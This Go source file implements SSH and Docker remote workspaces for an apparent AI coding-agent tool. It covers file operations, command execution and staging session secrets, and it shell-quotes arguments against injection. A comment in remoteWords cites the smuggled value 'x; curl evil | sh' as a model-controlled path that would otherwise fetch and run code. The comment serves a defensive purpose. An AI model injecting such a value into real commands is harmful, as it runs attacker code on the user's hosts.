package tool

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"io/fs"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unicode"

	"github.com/xmonader/janetcode/internal/secret"
	"github.com/xmonader/janetcode/internal/shell"
	"github.com/xmonader/janetcode/internal/textfmt"
)

// remoteHost is an SSH or Docker workspace: file ops and bash go through
// a local helper binary (ssh or docker exec) rather than the process's
// own filesystem.
type remoteHost struct {
	kind   string // ssh or docker
	target string // user@host or container
	root   string
}

func (h *remoteHost) Kind() string { return h.kind }
func (h *remoteHost) Root() string { return h.root }
func (h *remoteHost) Close() error { return nil }
func (h *remoteHost) Label() string {
	switch h.kind {
	case "docker":
		return "docker:" + h.target + ":" + h.root
	default:
		return h.target + ":" + h.root
	}
}

func (h *remoteHost) argv(ctx context.Context, stdin io.Reader, args ...string) ([]byte, error) {
	if ctx == nil {
		ctx = context.Background()
	}
	var cmd *exec.Cmd
	switch h.kind {
	case "docker":
		// docker exec passes argv straight to the container: no remote
		// shell parses it, so the words go through as they are.
		a := append([]string{"exec", "-i", h.target}, args...)
		cmd = exec.CommandContext(ctx, "docker", a...)
	default:
		a := append(sshArgs(h.target), h.remoteWords(args)...)
		cmd = exec.CommandContext(ctx, "ssh", a...)
	}
	cmd.Stdin = stdin
	return cmd.CombinedOutput()
}

// remoteWords makes argv safe for the remote shell. The SSH exec protocol
// carries a single command string: the client joins the words after the
// target with spaces and the remote login shell parses the result. A
// model-controlled path like "x; curl evil | sh" would otherwise be
// reparsed as shell syntax, and read_file is a read-only tool that never
// prompts. Quoting every word makes each one opaque; the remote shell
// hands the tool exactly the bytes janetcode meant.
func (h *remoteHost) remoteWords(args []string) []string {
	if h.kind == "docker" {
		return args
	}
	quoted := make([]string, len(args))
	for i, a := range args {
		quoted[i] = shQuote(a)
	}
	return quoted
}

func (h *remoteHost) ReadFile(ctx context.Context, path string) ([]byte, error) {
	out, err := h.argv(ctx, nil, "cat", "--", path)
	if err != nil {
		return nil, remoteErr("read", path, out, err)
	}
	return out, nil
}

func (h *remoteHost) WriteFile(ctx context.Context, path string, data []byte, perm os.FileMode) error {
	if err := h.MkdirAll(ctx, filepath.Dir(path), 0o755); err != nil {
		return err
	}
	out, err := h.argv(ctx, bytes.NewReader(data), "tee", path)
	if err != nil {
		return remoteErr("write", path, out, err)
	}
	if perm != 0 {
		mode := fmt.Sprintf("%04o", perm.Perm())
		if out, err := h.argv(ctx, nil, "chmod", mode, path); err != nil {
			return remoteErr("chmod", path, out, err)
		}
	}
	return nil
}

func (h *remoteHost) Stat(ctx context.Context, path string) (os.FileInfo, error) {
	if out, err := h.argv(ctx, nil, "test", "-d", path); err == nil {
		return remoteInfo{name: filepath.Base(path), dir: true}, nil
	} else if isNotExistOutput(string(out)) {
		return nil, os.ErrNotExist
	}
	if _, err := h.argv(ctx, nil, "test", "-e", path); err != nil {
		return nil, os.ErrNotExist
	}
	return remoteInfo{name: filepath.Base(path), dir: false}, nil
}

func (h *remoteHost) ReadDir(ctx context.Context, path string) ([]os.DirEntry, error) {
	out, err := h.argv(ctx, nil, "ls", "-1Ap", path)
	if err != nil {
		return nil, remoteErr("list", path, out, err)
	}
	var entries []os.DirEntry
	for _, line := range strings.Split(strings.TrimRight(string(out), "\n"), "\n") {
		line = strings.TrimSpace(line)
		if line == "" || line == "./" || line == "../" {
			continue
		}
		dir := strings.HasSuffix(line, "/")
		name := strings.TrimSuffix(line, "/")
		entries = append(entries, remoteEntry{name: name, dir: dir})
	}
	return entries, nil
}

func (h *remoteHost) MkdirAll(ctx context.Context, path string, _ os.FileMode) error {
	if path == "" || path == "." || path == "/" {
		return nil
	}
	out, err := h.argv(ctx, nil, "mkdir", "-p", path)
	if err != nil {
		return remoteErr("mkdir", path, out, err)
	}
	return nil
}

func (h *remoteHost) Remove(ctx context.Context, path string) error {
	out, err := h.argv(ctx, nil, "rm", "-f", path)
	if err != nil {
		return remoteErr("remove", path, out, err)
	}
	return nil
}

func (h *remoteHost) Rename(ctx context.Context, oldpath, newpath string) error {
	out, err := h.argv(ctx, nil, "mv", "-f", oldpath, newpath)
	if err != nil {
		return remoteErr("rename", oldpath, out, err)
	}
	return nil
}

func (h *remoteHost) Open(ctx context.Context, path string) (io.ReadCloser, error) {
	data, err := h.ReadFile(ctx, path)
	if err != nil {
		return nil, err
	}
	return readSeekCloser{bytes.NewReader(data)}, nil
}

type readSeekCloser struct{ *bytes.Reader }

func (readSeekCloser) Close() error { return nil }

func (h *remoteHost) WalkDir(ctx context.Context, root string, fn fs.WalkDirFunc) error {
	out, err := h.argv(ctx, nil, "find", root)
	if err != nil {
		return remoteErr("walk", root, out, err)
	}
	// Which entries are directories comes from one more find rather than
	// a Stat per entry: that was two ssh or docker round trips for every
	// file in the tree.
	dirOut, err := h.argv(ctx, nil, "find", root, "-type", "d")
	if err != nil {
		return remoteErr("walk", root, dirOut, err)
	}
	dirs := map[string]bool{}
	for _, p := range strings.Split(string(dirOut), "\n") {
		if p = strings.TrimSpace(p); p != "" {
			dirs[p] = true
		}
	}
	// SkipDir has to skip what is under the directory, as filepath.WalkDir
	// does. It used to skip only the directory's own entry, so a glob on
	// a remote host went on into .git and node_modules — listing what the
	// local walk leaves out. find prints a directory before its contents,
	// so one skipped prefix at a time is enough.
	skip := ""
	for _, p := range strings.Split(strings.TrimRight(string(out), "\n"), "\n") {
		p = strings.TrimSpace(p)
		if p == "" {
			continue
		}
		if skip != "" && strings.HasPrefix(p, skip) {
			continue
		}
		d := remoteEntry{name: filepath.Base(p), dir: dirs[p]}
		if err := fn(p, d, nil); err != nil {
			switch {
			case err == fs.SkipAll:
				return nil
			case err == fs.SkipDir:
				// On a file, SkipDir skips the rest of its directory.
				dir := p
				if !d.dir {
					dir = filepath.Dir(p)
				}
				if dir == root {
					return nil
				}
				skip = strings.TrimSuffix(dir, "/") + "/"
				continue
			}
			return err
		}
	}
	return nil
}

func (h *remoteHost) Command(ctx context.Context, command string) (*exec.Cmd, error) {
	secrets := shell.SessionSecrets()
	var cmd *exec.Cmd
	switch h.kind {
	case "docker":
		args := []string{"exec", "-i", "-w", h.root}
		// "-e NAME" without a value takes it from docker's own
		// environment (set below by ScrubEnv), so the value is on no
		// command line.
		for _, kv := range secrets {
			name, _, _ := strings.Cut(kv, "=")
			args = append(args, "-e", name)
		}
		cmd = exec.CommandContext(ctx, "docker", append(args, h.target, "bash", "-lc", command)...)
	default:
		script := "cd " + shQuote(h.root) + " && " + command
		if len(secrets) > 0 {
			file, err := h.stageSecrets(ctx, secrets)
			if err != nil {
				return nil, err
			}
			// The file is read and removed before the command starts, so
			// the values sit on the remote disk (mode 600) only between
			// the two ssh calls.
			script = "cd " + shQuote(h.root) + " && { . " + shQuote(file) + "; rm -f " + shQuote(file) + "; true; } && " + command
		}
		cmd = exec.CommandContext(ctx, "ssh", append(sshArgs(h.target), h.remoteWords([]string{"bash", "-lc", script})...)...)
	}
	cmd.Env = shell.ScrubEnv(os.Environ())
	shell.SetProcessGroup(cmd)
	return cmd, nil
}

// stageSecrets writes the session secrets to a private file on the remote
// as export lines and returns its path. The values travel on ssh's stdin:
// not in an argument, so not in a process list or a log, and not in the
// environment, which ssh forwards only if the server allows it. The
// command's own stdin is not an option: the bash tool and the jobs
// registry own it.
func (h *remoteHost) stageSecrets(ctx context.Context, secrets []string) (string, error) {
	var sb strings.Builder
	for _, kv := range secrets {
		name, value, _ := strings.Cut(kv, "=")
		sb.WriteString("export " + name + "=" + shQuote(value) + "\n")
	}
	out, err := h.argv(ctx, strings.NewReader(sb.String()), "sh", "-c", `umask 077; f=$(mktemp) || exit 1; cat > "$f" || { rm -f "$f"; exit 1; }; printf %s "$f"`)
	reply := strings.TrimSpace(string(out))
	if err != nil || reply == "" || strings.ContainsAny(reply, "\n\r") {
		reply, _ = secret.Redact(reply)
		return "", fmt.Errorf("forwarding session secrets to %s failed (%v): %s", h.Label(), err, textfmt.Clip(reply, 300))
	}
	return reply, nil
}

func sshArgs(target string) []string {
	return []string{"-o", "BatchMode=yes", "-o", "ConnectTimeout=10", target, "--"}
}

// ParseSSHSpec splits user@host[:path] into the ssh target and an optional
// remote working directory. A trailing :digits is a port, which belongs
// in ~/.ssh/config rather than here.
func ParseSSHSpec(spec string) (target, path string, err error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return "", "", fmt.Errorf("usage: /ssh user@host[:/path]")
	}
	if i := strings.LastIndex(spec, ":"); i > 0 {
		rest := spec[i+1:]
		if rest == "" {
			return spec[:i], "", nil
		}
		if allDigits(rest) {
			return "", "", fmt.Errorf("a port in the spec is not supported; put Port in ~/.ssh/config for %s", spec[:i])
		}
		return spec[:i], rest, nil
	}
	return spec, "", nil
}

// ParseDockerSpec splits container[:/path] or "container /path".
func ParseDockerSpec(spec string) (container, path string, err error) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return "", "", fmt.Errorf("usage: /docker <container>[:/path]")
	}
	if i := strings.LastIndex(spec, ":/"); i >= 0 {
		return spec[:i], spec[i+1:], nil
	}
	fields := strings.Fields(spec)
	if len(fields) >= 2 {
		return fields[0], strings.Join(fields[1:], " "), nil
	}
	return spec, "", nil
}

// DialSSH probes user@host and returns a host rooted at path, or at the
// remote pwd when path is omitted.
func DialSSH(spec string) (Host, error) {
	target, path, err := ParseSSHSpec(spec)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "ssh", append(sshArgs(target), "pwd")...)
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			return nil, fmt.Errorf("ssh %s: %w", target, err)
		}
		return nil, fmt.Errorf("ssh %s: %s", target, msg)
	}
	pwd := strings.TrimSpace(string(out))
	if path == "" {
		path = pwd
	} else if strings.HasPrefix(path, "~") {
		home := pwd
		// Quoting every remote word means the expansion has to happen on
		// the far side: one script word, expanded by the remote sh.
		probe := exec.CommandContext(ctx, "ssh", append(sshArgs(target), "sh", "-c", shQuote(`printf %s "$HOME"`))...)
		if homeOut, herr := probe.CombinedOutput(); herr == nil && strings.TrimSpace(string(homeOut)) != "" {
			home = strings.TrimSpace(string(homeOut))
		}
		path = home + strings.TrimPrefix(path, "~")
	}
	return &remoteHost{kind: "ssh", target: target, root: path}, nil
}

// DialDocker probes a container and returns a host rooted at path, or at
// the container's pwd when path is omitted.
func DialDocker(spec string) (Host, error) {
	container, path, err := ParseDockerSpec(spec)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "docker", "exec", container, "pwd")
	out, err := cmd.CombinedOutput()
	if err != nil {
		msg := strings.TrimSpace(string(out))
		if msg == "" {
			return nil, fmt.Errorf("docker %s: %w", container, err)
		}
		return nil, fmt.Errorf("docker %s: %s", container, msg)
	}
	if path == "" {
		path = strings.TrimSpace(string(out))
	}
	return &remoteHost{kind: "docker", target: container, root: path}, nil
}

func allDigits(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if !unicode.IsDigit(r) {
			return false
		}
	}
	return true
}

type remoteInfo struct {
	name string
	dir  bool
}

func (i remoteInfo) Name() string { return i.name }
func (i remoteInfo) Size() int64  { return 0 }
func (i remoteInfo) Mode() os.FileMode {
	if i.dir {
		return os.ModeDir | 0o755
	}
	return 0o644
}
func (i remoteInfo) ModTime() time.Time { return time.Time{} }
func (i remoteInfo) IsDir() bool        { return i.dir }
func (i remoteInfo) Sys() any           { return nil }

type remoteEntry struct {
	name string
	dir  bool
}

func (e remoteEntry) Name() string      { return e.name }
func (e remoteEntry) IsDir() bool       { return e.dir }
func (e remoteEntry) Type() os.FileMode { return remoteInfo(e).Mode() }
func (e remoteEntry) Info() (os.FileInfo, error) {
	return remoteInfo(e), nil
}
